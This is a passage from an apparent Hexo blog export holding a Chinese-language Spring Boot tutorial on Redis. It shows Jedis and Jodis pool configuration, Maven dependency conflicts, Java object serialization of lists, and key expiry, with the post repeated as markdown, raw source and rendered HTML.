proxy个数创建相应个数的jedispool封装<br/>为RoundRobinJedisPool，并监听节点的变化，proxy的地址会传回来，可以及时增删配置的jedispool<br/>\n\n配置类\n```\npackage com.example.redisdemo.jodis;\n\nimport com.wandoulabs.jodis.JedisResourcePool;\nimport com.wandoulabs.jodis.RoundRobinJedisPool;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.context.annotation.PropertySource;\nimport redis.clients.jedis.JedisPoolConfig;\n\n@Configuration\n@PropertySource({ \"classpath:application.properties\" })\npublic class JodisConfig {\n    @Value(\"${spring.jodis.zkPath}\")\n    private String zkPath;\n    @Value(\"${spring.jodis.product}\")\n    private String product;\n    @Value(\"${spring.jodis.zkPassword}\")\n    private String zkPassword;\n    @Value(\"${spring.jodis.zkTimeout}\")\n    private int zkTimeout;\n    @Value(\"${spring.jodis.maxTotal}\")\n    private String maxTotal;\n    @Value(\"${spring.jodis.maxWaitMillis}\")\n    private String maxWaitMillis;\n    @Value(\"${spring.jodis.poolMinIdle}\")\n    private int poolMinIdele;\n    @Value(\"${spring.jodis.poolMaxIdle}\")\n    private int poolMaxIdle;\n    @Value(\"${spring.jodis.testOnBorrow}\")\n    private boolean testOnBorrow;\n    @Value(\"${spring.jodis.testOnReturn}\")\n    private boolean testOnReturn;\n\n    @Bean\n    public JedisResourcePool zkJedisPool(){\n        JedisResourcePool jedisPool = null;\n\n        try {\n            JedisPoolConfig config = new JedisPoolConfig();\n            config.setMaxTotal(Integer.parseInt(maxTotal));\n            config.setMaxWaitMillis(Integer.parseInt(maxWaitMillis));\n            config.setMaxIdle(poolMaxIdle);\n            config.setMinIdle(poolMinIdele);\n            config.setTestOnBorrow(testOnBorrow);\n            config.setTestOnReturn(testOnReturn);\n            jedisPool = RoundRobinJedisPool.create().curatorClient(zkPath, zkTimeout)\n                    .zkProxyDir(product).password(zkPassword)\n                    .poolConfig(config).build();\n        }catch (Exception e){\n            System.out.println(\"jodis 连接出错。\");\n        }\n        return jedisPool;\n    }\n\n}\n\n```\n\n使用\n```\npackage com.example.redisdemo.jodis;\n\nimport com.example.redisdemo.jedis.ObjectTranscoder;\nimport com.wandoulabs.jodis.JedisResourcePool;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\nimport redis.clients.jedis.Jedis;\n\nimport java.util.List;\n\n@Service\npublic class JodisServer {\n\n    @Autowired\n    JedisResourcePool jedisResourcePool;\n\n    public void setKey(String key, Object value, int time){\n        Jedis jedis = jedisResourcePool.getResource();\n        jedis.setex(key.getBytes(),time, ObjectTranscoder.serialize(value));\n    }\n    public void setKey(String key, Object value){\n        Jedis jedis = jedisResourcePool.getResource();\n        System.out.println(\"ttl: \");\n        System.out.println(jedis.ttl(key));\n        //long转int,向下转换，可能溢出，不能直接转换，所以long -> String -> int\n        jedis.setex(key.getBytes(),Integer.parseInt(String.valueOf(jedis.ttl(key))), ObjectTranscoder.serialize(value));\n        //jedis.setex(key.getBytes(),20, ObjectTranscoder.serialize(value));\n    }\n\n    public Object getKey(String key){\n        Jedis jedis = jedisResourcePool.getResource();\n        if(jedis == null || !jedis.exists(key.getBytes())){\n            return null;\n        }\n        byte[] in = jedis.get(key.getBytes());\n        List list = (List) ObjectTranscoder.deserialize(in);\n        return list;\n    }\n}\n\n```\n\n## 2.一些注意事项\n### 2.1 存储数据\n在jedis存储数据过程中\n```\npublic String set(String key, String value) {\n  this.checkIsInMultiOrPipeline();\n  this.client.set(key, value);\n  return this.client.getStatusCodeReply();\n}\n```\n类型为String,String 所以我们要存储List数据，需要先进行序列化<br/>\nSerialization（序列化）是一种将对象以一连串的字节描述的过程；反序列化deserialization是一种将这些字节重建成一个对象的过程。<br/>\n\n```\n//存\npublic  void setKey(String key, Object value){\n  Jedis jedis = jedisPool.getResource();\n  jedis.set(key.getBytes(), ObjectTranscoder.serialize(value));\n}\n//取\npublic Object getKey(String key){\n    Jedis jedis = jedisPool.getResource();\n    if(jedis == null || !jedis.exists(key.getBytes())){\n        return null;\n    }\n    byte[] in = jedis.get(key.getBytes());\n    List list = (List) ObjectTranscoder.deserialize(in);\n    return list;\n}\n```\n序列化工具类\n```\npackage com.example.redisdemo.jedis;\n\nimport java.io.*;\n\n//序列化工具类\npublic class ObjectTranscoder {\n    public static byte[] serialize(Object value) {\n        if (value == null) {\n            throw new NullPointerException(\"Can't serialize null\");\n        }\n        byte[] rv=null;\n        ByteArrayOutputStream bos = null;\n        ObjectOutputStream os = null;\n        try {\n            bos = new ByteArrayOutputStream();\n            os = new ObjectOutputStream(bos);\n            os.writeObject(value);\n            os.close();\n            bos.close();\n            rv = bos.toByteArray();\n        } catch (IOException e) {\n            throw new IllegalArgumentException(\"Non-serializable object\", e);\n        } finally {\n            try {\n                if(os!=null)os.close();\n                if(bos!=null)bos.close();\n            }catch (Exception e2) {\n                e2.printStackTrace();\n            }\n        }\n        return rv;\n    }\n\n    public static Object deserialize(byte[] in) {\n        Object rv=null;\n        ByteArrayInputStream bis = null;\n        ObjectInputStream is = null;\n        try {\n            if(in != null) {\n                bis=new ByteArrayInputStream(in);\n                is=new ObjectInputStream(bis);\n                rv=is.readObject();\n                is.close();\n                bis.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }finally {\n            try {\n                if(is!=null)is.close();\n                if(bis!=null)bis.close();\n            } catch (Exception e2) {\n                e2.printStackTrace();\n            }\n        }\n        return rv;\n    }\n}\n```\n\n### 2.2 maven包冲突\n```\n      <!-- redis -->\n       <!--<dependency>-->\n           <!--<groupId>org.springframework.boot</groupId>-->\n           <!--<artifactId>spring-boot-starter-data-redis</artifactId>-->\n       <!--</dependency>-->\n       <dependency>\n           <groupId>redis.clients</groupId>\n           <artifactId>jedis</artifactId>\n           <version>2.7.3</version>\n       </dependency>\n       <dependency>\n           <groupId>com.wandoulabs.jodis</groupId>\n           <artifactId>jodis</artifactId>\n           <version>0.2.2</version>\n       </dependency>\n```\n\nspringboot自己集成的spring-boot-data-redis与redis-clients有冲突<br/>\nredis-clients可以与jodis配合使用，所以选择redis-clients.\n\n### 2.3 关于redis过期时间\n\nredis默认不过期，当内存满时，删除先存入的\n```\n//存短信记录,首次，设置过期时间\n   public void setJodisWithTime(String key, Object value, int time){\n       Jedis jedis = jedisResourcePool.getResource();\n       //set(String, String) 所以List需要序列化，有效时间为time\n       jedis.setex(key.getBytes(),time, FrequencyVerifiy.serialize(value));\n   }\n   //存短信记录，不重新设置过期时间,使用原有的\n   public void setJodis(String key, Object value){\n       Jedis jedis = jedisResourcePool.getResource();\n       //使用原有时间\n       int time = Integer.parseInt(String.valueOf(jedis.ttl(key)));\n       jedis.setex(key.getBytes(),time, FrequencyVerifiy.serialize(value));\n   }\n```\n\n\n# 一.Springboot集成Redis\n\n- maven依赖\n\n```\n<dependency>\n\t\t<groupId>org.springframework.boot</groupId>\n\t\t<artifactId>spring-boot-starter-data-redis</artifactId>\n</dependency>\n```\n\n- application.properties\n\n```\nspring.redis.host=127.0.0.1\nspring.redis.port=6379\n```\n- 配置类\n\n```\n@Configuration\npublic class RedisConfig  {\n\n    //spring 封装了 RedisTemplate 对象来进行对redis的各种操作，它支持所有的 redis 原生的 api\n    @Bean\n    public RedisTemplate redisTemplate(RedisConnectionFactory factory){\n        RedisTemplate<String,Object> redisTemplate = new RedisTemplate<>();\n        //设置序列化方式,不设置value\n        RedisSerializer redisSerializer =new StringRedisSerializer();\n        redisTemplate.setKeySerializer(redisSerializer);\n        redisTemplate.setHashKeySerializer(redisSerializer);\n        //连接\n        redisTemplate.setConnectionFactory(factory);\n        return redisTemplate;\n    }\n}\n```\n- 使用\n\n```\n@Service\npublic class RedisDemo {\n    @Autowired\n    RedisTemplate redisTemplate;\n\n    public  void setKey(String key, Object value){\n        ValueOperations<String,Object> vo = redisTemplate.opsForValue();\n        vo.set(key, value);\n        //设置过期时间\n        redisTemplate.expire(key,600,TimeUnit.SECONDS);\n    }\n\n    public  Object getKey(String key){\n        ValueOperations<String,Object> vo = redisTemplate.opsForValue();\n        return vo.get(key);\n    }\n\n\n}\n```\n","source":"_posts/java/springboot-redis.md","raw":"---\ntitle: springboot-redis\ndate: 2018-09-17 11:14:52\ntags: [springboot]\n---\n\n## 1.redis大概\n\n\n### 1.2 Jedis\n```\n<dependency>\n\t<groupId>redis.clients</groupId>\n\t<artifactId>jedis</artifactId>\n\t<version>2.7.3</version>\n</dependency>\n<!-- Springboot自带的redis与redis.clients有冲突，为了使用jodis,选redis.clients -->\n<!--<dependency>-->\n    <!--<groupId>org.springframework.boot</groupId>-->\n    <!--<artifactId>spring-boot-starter-data-redis</artifactId>-->\n<!--</dependency>-->\n```\n\n通过redis.clients.jedis.JedisPool来管理，即通过池来管理，通过池对象获取jedis实例，然后通过jedis实例直接操作redis服务，剔除了与业务无关的冗余代码\n<br/>\n\n配置类\n```\npackage com.example.redisdemo.jedis;\n\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.context.annotation.PropertySource;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\n@Configuration\n@PropertySource({ \"classpath:application.properties\" })\npublic class JedisConfig {\n\n    @Bean\n    public JedisPool getJedisPool(){\n        JedisPoolConfig config = new JedisPoolConfig();\n        //连接设置\n        //config.setMaxTotal(Integer.parseInt(maxTotal));\n        //config.set（等等）\n        //建立连接\n        JedisPool jedisPool = new JedisPool(config, \"127.0.0.1\", 6379);\n        return jedisPool;\n    }\n\n\n}\n\n```\n\n使用\n```\npackage com.example.redisdemo.jedis;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\n\nimport java.util.List;\n\n@Service\npublic class JedisServer {\n    @Autowired\n    JedisPool jedisPool;\n\n    public  void setKey(String key, Object value){\n        //try/catch后面添加\n        Jedis jedis = jedisPool.getResource();\n         //set(String, String) 所以List需要序列化,此处value为list\n        //jedis.set(key.getBytes(), ObjectTranscoder.serialize(value));\n        //设置过期时间\n        jedis.setex(key.getBytes(),600, ObjectTranscoder.serialize(value));\n    }\n\n    public Object getKey(String key){\n        Jedis jedis = jedisPool.getResource();\n        if(jedis == null || !jedis.exists(key.getBytes())){\n            return null;\n        }\n        byte[] in = jedis.get(key.getBytes());\n        List list = (List) ObjectTranscoder.deserialize(in);\n        return list;\n    }\n}\n\n```\n### 1.3 Jodis\n```\n        <dependency>\n            <groupId>redis.clients</groupId>\n            <artifactId>jedis</artifactId>\n            <version>2.7.3</version>\n        </dependency>\n        <dependency>\n            <groupId>com.wandoulabs.jodis</groupId>\n            <artifactId>jodis</artifactId>\n            <version>0.2.2</version>\n        </dependency>\n```\n\n与codis结合使用对jedispool做了封装。<br/>\n通过zookeeper上注册的codis proxy个数创建相应个数的jedispool封装<br/>为RoundRobinJedisPool，并监听节点的变化，proxy的地址会传回来，可以及时增删配置的jedispool<br/>\n\n配置类\n```\npackage com.example.redisdemo.jodis;\n\nimport com.wandoulabs.jodis.JedisResourcePool;\nimport com.wandoulabs.jodis.RoundRobinJedisPool;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.context.annotation.PropertySource;\nimport redis.clients.jedis.JedisPoolConfig;\n\n@Configuration\n@PropertySource({ \"classpath:application.properties\" })\npublic class JodisConfig {\n    @Value(\"${spring.jodis.zkPath}\")\n    private String zkPath;\n    @Value(\"${spring.jodis.product}\")\n    private String product;\n    @Value(\"${spring.jodis.zkPassword}\")\n    private String zkPassword;\n    @Value(\"${spring.jodis.zkTimeout}\")\n    private int zkTimeout;\n    @Value(\"${spring.jodis.maxTotal}\")\n    private String maxTotal;\n    @Value(\"${spring.jodis.maxWaitMillis}\")\n    private String maxWaitMillis;\n    @Value(\"${spring.jodis.poolMinIdle}\")\n    private int poolMinIdele;\n    @Value(\"${spring.jodis.poolMaxIdle}\")\n    private int poolMaxIdle;\n    @Value(\"${spring.jodis.testOnBorrow}\")\n    private boolean testOnBorrow;\n    @Value(\"${spring.jodis.testOnReturn}\")\n    private boolean testOnReturn;\n\n    @Bean\n    public JedisResourcePool zkJedisPool(){\n        JedisResourcePool jedisPool = null;\n\n        try {\n            JedisPoolConfig config = new JedisPoolConfig();\n            config.setMaxTotal(Integer.parseInt(maxTotal));\n            config.setMaxWaitMillis(Integer.parseInt(maxWaitMillis));\n            config.setMaxIdle(poolMaxIdle);\n            config.setMinIdle(poolMinIdele);\n            config.setTestOnBorrow(testOnBorrow);\n            config.setTestOnReturn(testOnReturn);\n            jedisPool = RoundRobinJedisPool.create().curatorClient(zkPath, zkTimeout)\n                    .zkProxyDir(product).password(zkPassword)\n                    .poolConfig(config).build();\n        }catch (Exception e){\n            System.out.println(\"jodis 连接出错。\");\n        }\n        return jedisPool;\n    }\n\n}\n\n```\n\n使用\n```\npackage com.example.redisdemo.jodis;\n\nimport com.example.redisdemo.jedis.ObjectTranscoder;\nimport com.wandoulabs.jodis.JedisResourcePool;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\nimport redis.clients.jedis.Jedis;\n\nimport java.util.List;\n\n@Service\npublic class JodisServer {\n\n    @Autowired\n    JedisResourcePool jedisResourcePool;\n\n    public void setKey(String key, Object value, int time){\n        Jedis jedis = jedisResourcePool.getResource();\n        jedis.setex(key.getBytes(),time, ObjectTranscoder.serialize(value));\n    }\n    public void setKey(String key, Object value){\n        Jedis jedis = jedisResourcePool.getResource();\n        System.out.println(\"ttl: \");\n        System.out.println(jedis.ttl(key));\n        //long转int,向下转换，可能溢出，不能直接转换，所以long -> String -> int\n        jedis.setex(key.getBytes(),Integer.parseInt(String.valueOf(jedis.ttl(key))), ObjectTranscoder.serialize(value));\n        //jedis.setex(key.getBytes(),20, ObjectTranscoder.serialize(value));\n    }\n\n    public Object getKey(String key){\n        Jedis jedis = jedisResourcePool.getResource();\n        if(jedis == null || !jedis.exists(key.getBytes())){\n            return null;\n        }\n        byte[] in = jedis.get(key.getBytes());\n        List list = (List) ObjectTranscoder.deserialize(in);\n        return list;\n    }\n}\n\n```\n\n## 2.一些注意事项\n### 2.1 存储数据\n在jedis存储数据过程中\n```\npublic String set(String key, String value) {\n  this.checkIsInMultiOrPipeline();\n  this.client.set(key, value);\n  return this.client.getStatusCodeReply();\n}\n```\n类型为String,String 所以我们要存储List数据，需要先进行序列化<br/>\nSerialization（序列化）是一种将对象以一连串的字节描述的过程；反序列化deserialization是一种将这些字节重建成一个对象的过程。<br/>\n\n```\n//存\npublic  void setKey(String key, Object value){\n  Jedis jedis = jedisPool.getResource();\n  jedis.set(key.getBytes(), ObjectTranscoder.serialize(value));\n}\n//取\npublic Object getKey(String key){\n    Jedis jedis = jedisPool.getResource();\n    if(jedis == null || !jedis.exists(key.getBytes())){\n        return null;\n    }\n    byte[] in = jedis.get(key.getBytes());\n    List list = (List) ObjectTranscoder.deserialize(in);\n    return list;\n}\n```\n序列化工具类\n```\npackage com.example.redisdemo.jedis;\n\nimport java.io.*;\n\n//序列化工具类\npublic class ObjectTranscoder {\n    public static byte[] serialize(Object value) {\n        if (value == null) {\n            throw new NullPointerException(\"Can't serialize null\");\n        }\n        byte[] rv=null;\n        ByteArrayOutputStream bos = null;\n        ObjectOutputStream os = null;\n        try {\n            bos = new ByteArrayOutputStream();\n            os = new ObjectOutputStream(bos);\n            os.writeObject(value);\n            os.close();\n            bos.close();\n            rv = bos.toByteArray();\n        } catch (IOException e) {\n            throw new IllegalArgumentException(\"Non-serializable object\", e);\n        } finally {\n            try {\n                if(os!=null)os.close();\n                if(bos!=null)bos.close();\n            }catch (Exception e2) {\n                e2.printStackTrace();\n            }\n        }\n        return rv;\n    }\n\n    public static Object deserialize(byte[] in) {\n        Object rv=null;\n        ByteArrayInputStream bis = null;\n        ObjectInputStream is = null;\n        try {\n            if(in != null) {\n                bis=new ByteArrayInputStream(in);\n                is=new ObjectInputStream(bis);\n                rv=is.readObject();\n                is.close();\n                bis.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }finally {\n            try {\n                if(is!=null)is.close();\n                if(bis!=null)bis.close();\n            } catch (Exception e2) {\n                e2.printStackTrace();\n            }\n        }\n        return rv;\n    }\n}\n```\n\n### 2.2 maven包冲突\n```\n      <!-- redis -->\n       <!--<dependency>-->\n           <!--<groupId>org.springframework.boot</groupId>-->\n           <!--<artifactId>spring-boot-starter-data-redis</artifactId>-->\n       <!--</dependency>-->\n       <dependency>\n           <groupId>redis.clients</groupId>\n           <artifactId>jedis</artifactId>\n           <version>2.7.3</version>\n       </dependency>\n       <dependency>\n           <groupId>com.wandoulabs.jodis</groupId>\n           <artifactId>jodis</artifactId>\n           <version>0.2.2</version>\n       </dependency>\n```\n\nspringboot自己集成的spring-boot-data-redis与redis-clients有冲突<br/>\nredis-clients可以与jodis配合使用，所以选择redis-clients.\n\n### 2.3 关于redis过期时间\n\nredis默认不过期，当内存满时，删除先存入的\n```\n//存短信记录,首次，设置过期时间\n   public void setJodisWithTime(String key, Object value, int time){\n       Jedis jedis = jedisResourcePool.getResource();\n       //set(String, String) 所以List需要序列化，有效时间为time\n       jedis.setex(key.getBytes(),time, FrequencyVerifiy.serialize(value));\n   }\n   //存短信记录，不重新设置过期时间,使用原有的\n   public void setJodis(String key, Object value){\n       Jedis jedis = jedisResourcePool.getResource();\n       //使用原有时间\n       int time = Integer.parseInt(String.valueOf(jedis.ttl(key)));\n       jedis.setex(key.getBytes(),time, FrequencyVerifiy.serialize(value));\n   }\n```\n\n\n# 一.Springboot集成Redis\n\n- maven依赖\n\n```\n<dependency>\n\t\t<groupId>org.springframework.boot</groupId>\n\t\t<artifactId>spring-boot-starter-data-redis</artifactId>\n</dependency>\n```\n\n- application.properties\n\n```\nspring.redis.host=127.0.0.1\nspring.redis.port=6379\n```\n- 配置类\n\n```\n@Configuration\npublic class RedisConfig  {\n\n    //spring 封装了 RedisTemplate 对象来进行对redis的各种操作，它支持所有的 redis 原生的 api\n    @Bean\n    public RedisTemplate redisTemplate(RedisConnectionFactory factory){\n        RedisTemplate<String,Object> redisTemplate = new RedisTemplate<>();\n        //设置序列化方式,不设置value\n        RedisSerializer redisSerializer =new StringRedisSerializer();\n        redisTemplate.setKeySerializer(redisSerializer);\n        redisTemplate.setHashKeySerializer(redisSerializer);\n        //连接\n        redisTemplate.setConnectionFactory(factory);\n        return redisTemplate;\n    }\n}\n```\n- 使用\n\n```\n@Service\npublic class RedisDemo {\n    @Autowired\n    RedisTemplate redisTemplate;\n\n    public  void setKey(String key, Object value){\n        ValueOperations<String,Object> vo = redisTemplate.opsForValue();\n        vo.set(key, value);\n        //设置过期时间\n        redisTemplate.expire(key,600,TimeUnit.SECONDS);\n    }\n\n    public  Object getKey(String key){\n        ValueOperations<String,Object> vo = redisTemplate.opsForValue();\n        return vo.get(key);\n    }\n\n\n}\n```\n","slug":"java/springboot-redis","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321j0003d6dcp9s6suy7o","content":"<h2 id=\"1-redis大概\"><a href=\"#1-redis大概\" class=\"headerlink\" title=\"1.redis大概\"></a>1.redis大概</h2><h3 id=\"1-2-Jedis\"><a href=\"#1-2-Jedis\" class=\"headerlink\" title=\"1.2 Jedis\"></a>1.2 Jedis</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;2.7.3&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;!-- Springboot自带的redis与redis.clients有冲突，为了使用jodis,选redis.clients --&gt;</span><br><span class=\"line\">&lt;!--&lt;dependency&gt;--&gt;</span><br><span class=\"line\">    &lt;!--&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;--&gt;</span><br><span class=\"line\">    &lt;!--&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;--&gt;</span><br><span class=\"line\">&lt;!--&lt;/dependency&gt;--&gt;</span><br></pre></td></tr></table></figure>\n<p>通过redis.clients.jedis.JedisPool来管理，即通过池来管理，通过池对象获取jedis实例，然后通过jedis实例直接操作redis服务，剔除了与业务无关的冗余代码<br><br></p>\n<p>配置类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jedis;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Value;</span><br><span class=\"line\">import org.springframework.context.annotation.Bean;</span><br><span class=\"line\">import org.springframework.context.annotation.Configuration;</span><br><span class=\"line\">import org.springframework.context.annotation.PropertySource;</span><br><span class=\"line\">import redis.clients.jedis.JedisPool;</span><br><span class=\"line\">import redis.clients.jedis.JedisPoolConfig;</span><br><span class=\"line\"></span><br><span class=\"line\">@Configuration</span><br><span class=\"line\">@PropertySource(&#123; &quot;classpath:application.properties&quot; &#125;)</span><br><span class=\"line\">public class JedisConfig &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Bean</span><br><span class=\"line\">    public JedisPool getJedisPool()&#123;</span><br><span class=\"line\">        JedisPoolConfig config = new JedisPoolConfig();</span><br><span class=\"line\">        //连接设置</span><br><span class=\"line\">        //config.setMaxTotal(Integer.parseInt(maxTotal));</span><br><span class=\"line\">        //config.set（等等）</span><br><span class=\"line\">        //建立连接</span><br><span class=\"line\">        JedisPool jedisPool = new JedisPool(config, &quot;127.0.0.1&quot;, 6379);</span><br><span class=\"line\">        return jedisPool;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jedis;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.stereotype.Service;</span><br><span class=\"line\">import redis.clients.jedis.Jedis;</span><br><span class=\"line\">import redis.clients.jedis.JedisPool;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\">@Service</span><br><span class=\"line\">public class JedisServer &#123;</span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    JedisPool jedisPool;</span><br><span class=\"line\"></span><br><span class=\"line\">    public  void setKey(String key, Object value)&#123;</span><br><span class=\"line\">        //try/catch后面添加</span><br><span class=\"line\">        Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">         //set(String, String) 所以List需要序列化,此处value为list</span><br><span class=\"line\">        //jedis.set(key.getBytes(), ObjectTranscoder.serialize(value));</span><br><span class=\"line\">        //设置过期时间</span><br><span class=\"line\">        jedis.setex(key.getBytes(),600, ObjectTranscoder.serialize(value));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public Object getKey(String key)&#123;</span><br><span class=\"line\">        Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">        if(jedis == null || !jedis.exists(key.getBytes()))&#123;</span><br><span class=\"line\">            return null;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        byte[] in = jedis.get(key.getBytes());</span><br><span class=\"line\">        List list = (List) ObjectTranscoder.deserialize(in);</span><br><span class=\"line\">        return list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"1-3-Jodis\"><a href=\"#1-3-Jodis\" class=\"headerlink\" title=\"1.3 Jodis\"></a>1.3 Jodis</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;2.7.3&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;com.wandoulabs.jodis&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;jodis&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;0.2.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n<p>与codis结合使用对jedispool做了封装。<br><br>通过zookeeper上注册的codis proxy个数创建相应个数的jedispool封装<br>为RoundRobinJedisPool，并监听节点的变化，proxy的地址会传回来，可以及时增删配置的jedispool<br></p>\n<p>配置类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jodis;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.wandoulabs.jodis.JedisResourcePool;</span><br><span class=\"line\">import com.wandoulabs.jodis.RoundRobinJedisPool;</span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Value;</span><br><span class=\"line\">import org.springframework.context.annotation.Bean;</span><br><span class=\"line\">import org.springframework.context.annotation.Configuration;</span><br><span class=\"line\">import org.springframework.context.annotation.PropertySource;</span><br><span class=\"line\">import redis.clients.jedis.JedisPoolConfig;</span><br><span class=\"line\"></span><br><span class=\"line\">@Configuration</span><br><span class=\"line\">@PropertySource(&#123; &quot;classpath:application.properties&quot; 